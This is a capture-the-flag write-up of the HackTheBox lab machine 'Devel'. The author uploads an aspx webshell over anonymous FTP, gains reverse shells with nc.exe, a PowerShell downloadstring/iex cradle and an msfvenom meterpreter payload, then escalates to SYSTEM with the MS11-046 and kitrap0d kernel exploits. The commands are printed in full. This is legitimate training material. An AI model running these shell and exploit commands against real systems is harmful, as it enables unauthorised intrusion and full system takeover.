---
title: HTB: Devel
url: https://0xdf.gitlab.io/2019/03/05/htb-devel.html
date: 2019-03-05T18:24:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, htb-devel, hackthebox, webshell, aspx, meterpreter, metasploit, msfvenom, ms11-046, ftp, nishang, nmap, watson, smbserver, upload, windows, oscp-like-v1
---

![Devel-cover](https://0xdfimages.gitlab.io/img/devel-cover.png)

Another one of the first boxes on HTB, and another simple beginner Windows target. In this case, I’ll use anonymous access to FTP that has it’s root in the webroot of the machine. I can upload a webshell, and use it to get execution and then a shell on the machine. Then I’ll use one of many available Windows kernel exploits to gain system. I’ll do it all without Metasploit, and then with Metasploit.

## Box Info

| Name | [Devel](https://hackthebox.com/machines/devel)  [Devel](https://hackthebox.com/machines/devel) [Play on HackTheBox](https://hackthebox.com/machines/devel) |
| --- | --- |
| Release Date | 15 Mar 2017 |
| Retire Date | 14 Oct 2017 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Devel |
| Radar Graph | Radar chart for Devel |
| First Blood User | 20 days19:20:43[pzyc0 pzyc0](https://app.hackthebox.com/users/43) |
| First Blood Root | 20 days19:20:19[pzyc0 pzyc0](https://app.hackthebox.com/users/43) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` shows two ports, ftp (TCP 21) and http (TCP 80):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 21:22 EST
Nmap scan report for 10.10.10.5
Host is up (0.020s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds

root@kali# nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 21:44 EST
Nmap scan report for 10.10.10.5
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds

```

Right away I notice a couple interesting things:
- There’s anonymous login to ftp.
- The files in ftp picked up by `nmap` look a lot like the web root on a Windows host.

### FTP - TCP 21

Not much to enumerate beyond what was in the `nmap` script results. I can log in with username “anonymous” and an empty password. No real files of interest.

### Website - TCP 80

The page is just the default IIS page:

![1550804961879](https://0xdfimages.gitlab.io/img/1550804961879.png)

I could kick off a `gobuster` to look for more paths, but given my theory about the web root being accessible via ftp, I’ll skip `gobuster` in favor of attacking that.

I can also add more weight to this theory by checking the two files from ftp, and confirming they exist on the web server. They do. `http://10.10.10.5/iisstart.htm` loads the same page as the root url, and `welcome.png` is the image on that page.

One other thing I will observe - If I look in burp at the http response, I see the following header:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 25 Feb 2019 10:40:02 GMT
Connection: close
Content-Length: 689

```

Seeing that this server is running ASP.NET means I will likely need a .aspx webshell when I get to that.

## Shell as web

### Webshell Upload

I always like to start with a simple web shell to test execution. In this case, I’m going to try aspx. If you google for aspx webshell, you’ll find tons out there. I like the one that comes with [SecLists](https://github.com/danielmiessler/SecLists). I’ll find it and copy it to my local directory:

```

root@kali# locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
root@kali# cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .

```

Now I’ll upload it over ftp:

```

ftp> put cmd.aspx  
local: cmd.aspx remote: cmd.aspx 
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.                              
1442 bytes sent in 0.00 secs (985.4465 kB/s) 

```

### Webshell Execition

Now I can just visit `http://10.10.10.5/cmd.aspx` and I get a form:

![1550832779390](https://0xdfimages.gitlab.io/img/1550832779390.png)

Running `whoami` gives me output:

![1550832798627](https://0xdfimages.gitlab.io/img/1550832798627.png)

### Shell

I’ll show three ways to get a shell from here, using `nc.exe`, [Nishang](https://github.com/samratashok/nishang), and `meterpreter`.

#### nc.exe

On a Windows host, my favorite way to move files back and forth is with `smbserver.py`. I’ll make a directory called smb, and copy `nc.exe` into it:

```

root@kali# mkdir smb
root@kali# locate nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/opt/shells/netcat/nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-binaries/nc.exe
root@kali# cp /usr/share/windows-binaries/nc.exe smb/

```

Now I’ll start the smb server:

```

root@kali# smbserver.py share smb
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

I’ll also start a `nc` listener on my local box to catch the shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```

I’ll enter the following command into the webshell:

```

\\10.10.14.14\share\nc.exe -e cmd.exe 10.10.14.14 443

```

And I get a shell on my listener:

```

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>

```

Here’s the entire process:

[![](https://0xdfimages.gitlab.io/img/devel-shell.gif)](https://0xdfimages.gitlab.io/img/devel-shell.gif)
*click gif for full size version*

#### Nishang

[Nishang](https://github.com/samratashok/nishang) is a framework of scripts and payloads that enables using PowerShell for offensive security. I’ll show the reverse shell, but there is a ton more stuff in here.

I’ll clone it to my local system:

```

root@kali:/opt# git clone https://github.com/samratashok/nishang.git
Cloning into 'nishang'...
remote: Enumerating objects: 1660, done.
remote: Total 1660 (delta 0), reused 0 (delta 0), pack-reused 1660
Receiving objects: 100% (1660/1660), 6.62 MiB | 23.70 MiB/s, done.
Resolving deltas: 100% (1040/1040), done.

```

Next I’ll grab a copy of `InvokePowerShellTcp.ps1` from `/opt/nishang/Shells/`. I’ll place it in my smb directory (even though I’m going to use http to get it). I’ll go to that directory, and open it in a text editor. I’ll find the example invocation for the reverse shell:

```

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

```

I’ll copy that line, and go to the bottom of the file, and paste it in, and modify it to match my IP/port:

```

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 443

```

This will make it so that not only does the module load, but then the shell is called to give me a callback.

Finally, inside that directory I’ll start my webserver using `python`, with `python3 -m http.server 80`, and start my listener with `nc -lnvp 443`.

Now I’m ready to get a shell. In my webshell, I’ll enter the following:

```

powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')

```

This will create a webclient object, and use the download string method to get the text that is returned from the given url. That text is passed into `iex`, which runs it.

The webserver gets a request for `Invoke-PowerShellTcp.ps1`:

```

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.5 - - [22/Feb/2019 16:28:17] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

Then `nc` gets a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.5.
Ncat: Connection from 10.10.10.5:49166.
Windows PowerShell running as user DEVEL$ on DEVEL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>

```

There are pluses and minus to this shell. It’s a nice PowerShell environment, and it’s lightweight. However, it’s not able to run some things, for example, the exploit binary that I’ll demonstrate below.

#### meterpreter

Rather than use the existing webshell, I’ll generate an aspx page that will return a meterpreter shell when I run it. If you did want to use the existing webshell, there’s a module called `exploit/multi/script/web_delivery` that will give you a PowerShell command to run in the shell (make sure you set the right target). Check if out if you want to play with it.

I’ll continue from scratch. First I’ll build the payload:

```

root@kali# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met_rev_443.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload    
[-] No arch selected, selecting arch: x86 from the payload                                
No encoder or badchars specified, outputting raw payload                                  
Payload size: 341 bytes                                                                   
Final size of aspx file: 2838 bytes   

```

Upload it over ftp:

```

ftp> put met_rev_443.aspx
local: met_rev_443.aspx remote: met_rev_443.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2874 bytes sent in 0.00 secs (5.3532 MB/s)

```

I’ll open Metasploit and start the `exploit/multi/handler`, which provides a listener for callbacks generated outside of Metasploit:

```

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) >
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost tun0
lhost => 10.10.14.14
msf5 exploit(multi/handler) > set lport 443
lport => 443

msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
   
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:443

```

Now just visit the page:

```

root@kali# curl http://10.10.10.5/met_rev_443.aspx

```

And get a shell:

```

[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.14:443 -> 10.10.10.5:49164) at 2019-03-05 12:09:09 -0500

meterpreter > getuid
Server username: IIS APPPOOL\Web

```

## Privesc: web –> System

### Enumeration

A `systeminfo` shows no patches applied:

```

c:\Users>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31
System Boot Time:          25/2/2019, 12:29:12
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 754 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.521 MB
Virtual Memory: In Use:    527 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5

```

This is likely vulnerable to many kernel exploits.

### Watson

I’ll use [Watson](https://github.com/rasta-mouse/Watson) to check for potential vulnerabilities / exploits.

#### Get .NET Versions

First I need to find out what .NET versions are installed on target. I can do that with a registry query:

```

c:\Users>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5

```

I could also look at the directories in the `\Windows\Microsoft.NET\Framework` directory:

```

c:\Windows\Microsoft.NET\Framework>dir /A:D
dir /A:D
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Windows\Microsoft.NET\Framework

14/07/2009  06:52     <DIR>          .
14/07/2009  06:52     <DIR>          ..
14/07/2009  04:37     <DIR>          v1.0.3705
14/07/2009  04:37     <DIR>          v1.1.4322
18/03/2017  01:06     <DIR>          v2.0.50727
14/07/2009  06:56     <DIR>          v3.0
14/07/2009  06:52     <DIR>          v3.5
               0 File(s)              0 bytes
               7 Dir(s)  24.586.067.968 bytes free

```

#### Compile Watson

[Watson](https://github.com/rasta-mouse/Watson) is a C# implementation of a tool to quickly identify missing software patches for local privesc vulnerabilities. I’ll download the zip from the GitHub page and double click `Watson.sln` in my Windows VM to open it in Visual Studio.

I’ll go to the Visual Studio menu and open Project -> Watson Properties. I’ll make sure Application is selected on the menu on the left, and there I should be able to set the “Target framework”:

![1550869015761](https://0xdfimages.gitlab.io/img/1550869015761.png)

I’ll set it to 3.5 since that’s the latest that’s installed on target.

Next, I’ll go to Build –> Configuration Manager. This let’s me set the architecture (x86 vs x64) for the output binary. I’ll remember from the `systeminfo` output that it was a x64 processor, but that the OS was x86:

```

System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.         
                           [01]: x64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz

```

I’ll change the Platform to x86:

![1550869563858](https://0xdfimages.gitlab.io/img/1550869563858.png)

Now I’ll go to Build –> Build Watson. In the bottom Window I should see:

![1550869614577](https://0xdfimages.gitlab.io/img/1550869614577.png)

I’ll go to that path, and get a copy of the output exe, and transfer it back to my Kali box and drop it in my `smb` folder.

#### Running It

Now I’ll run it directly from the SMB share, just like I did `nc`:

```

c:\Windows\Microsoft.NET\Framework>\\10.10.14.14\share\Watson.exe
\\10.10.14.14\share\Watson.exe
  __    __      _
 / / /\ \ \__ _| |_ ___  ___  _ __
 \ \/  \/ / _` | __/ __|/ _ \| '_ \
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|

                           v0.1

                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 7600
 [*] CPU Address Width: 32
 [*] Process IntPtr Size: 4
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS10-073
   [>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
   [>] Exploit: https://www.exploit-db.com/exploits/36327/
   [>] Notes: None.

  [*] Appears vulnerable to MS10-092
   [>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
   [>] Notes: None.

  [*] Appears vulnerable to MS11-046
   [>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
   [>] Exploit: https://www.exploit-db.com/exploits/40564/
   [>] Notes: None.

  [*] Appears vulnerable to MS12-042
   [>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
   [>] Exploit: https://www.exploit-db.com/exploits/20861/
   [>] Notes: None.

  [*] Appears vulnerable to MS13-005
   [>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
   [>] Notes: None.

 [*] Finished. Found 5 vulns :)
ERROR> The given key was not present in the dictionary.
ERROR> C:\WINDOWS\System32\win32kfull.sys
ERROR> C:\WINDOWS\System32\gdiplus.dll
ERROR> C:\WINDOWS\System32\coremessaging.dll

```

### MS11-046

A lot of these will have Metasploit modules. But if I’m going to do this without Metasploit, I’ll make use of a GitHub out there from abatchy17 called [WindowsExploits](https://github.com/abatchy17/WindowsExploits). He’s got a folder for MS11-046 with a precompiled exe. If I look through the [source](https://github.com/abatchy17/WindowsExploits/blob/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046/40564.c#L801) at the very bottom I’ll see this comment:

```

 // spawn SYSTEM shell within the current shell (remote shell friendly)

```

That’s exactly what I’m looking for. A sticking point for a lot of these precompiled exploits is that they launch a new elevated cmd shell, which is only useful if I have remote desktop or keyboard access.

I’ll save the exe in my smb share, and run it, and it doesn’t print anything, but I get a new shell as system:

```

c:\Windows\Microsoft.NET\Framework>\\10.10.14.14\share\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

```

From there, I can grab both flags (which for some reason each have an extra `.txt`):

```

c:\Users\babis\Desktop>type user.txt.txt
9ecdd6a3...

c:\Users\Administrator\Desktop>type root.txt.txt
e621a0b5...

```

Interestingly, when I exit the system shell, all of the things the exploit tried to print come out to the screen:

```

c:\Users\Administrator\Desktop>exit
[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82805000
      [*] Offset:       0x007c0000
      [+] HalDispatchTable
         [*] Offset:    0x008e93b8
   [+] NtQueryIntervalProfile
      [*] Address:      0x77225510
   [+] ZwDeviceIoControlFile
      [*] Address:      0x77224ca0
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [+] Done
      [*] Elevating privileges to SYSTEM
         [+] Done
         [*] Spawning shell

[*] Exiting SYSTEM shell

```

## Privesc Alternative: With Metasploit

### Enumeration

I don’t love relying on Metasploit, but one thing that it definitely makes easier is Windows kernel exploits. I’ll background my meterpreter session so I can use the exploit suggester to quickly look for potential privescs, and it returns several options:

```

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1

msf5 post(multi/recon/local_exploit_suggester) > options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

### MS10-015

I’ll give `exploit/windows/local/ms10_015_kitrap0d` a run.

```

msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

```

I’ll set the session to 1, and then run it… and it fails:

```

msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.1.1.41:4444
[*] Launching notepad to host the exploit...
[+] Process 2672 launched.
[*] Reflectively injecting the exploit DLL into 2672...
[*] Injecting exploit into 2672 ...
[*] Exploit injected. Injecting payload into 2672...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.

```

If I run `options`, I’ll see why:

```

msf5 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.1.1.41        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

```

Despite the fact that I didn’t set a payload, Meterpreter sets one for me. That’s nice, until it uses my eth0 IP address instead of my tun0 address. So when the exploit runs and succeeds, it’s trying to call to an IP it has no route to.

If I fix that, and run again, I get a shell:

```

msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lport 445
lport => 445
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.14:445
[*] Launching notepad to host the exploit...
[+] Process 3536 launched.
[*] Reflectively injecting the exploit DLL into 3536...
[*] Injecting exploit into 3536 ...
[*] Exploit injected. Injecting payload into 3536...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.14:445 -> 10.10.10.5:49159) at 2019-03-05 12:25:15 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```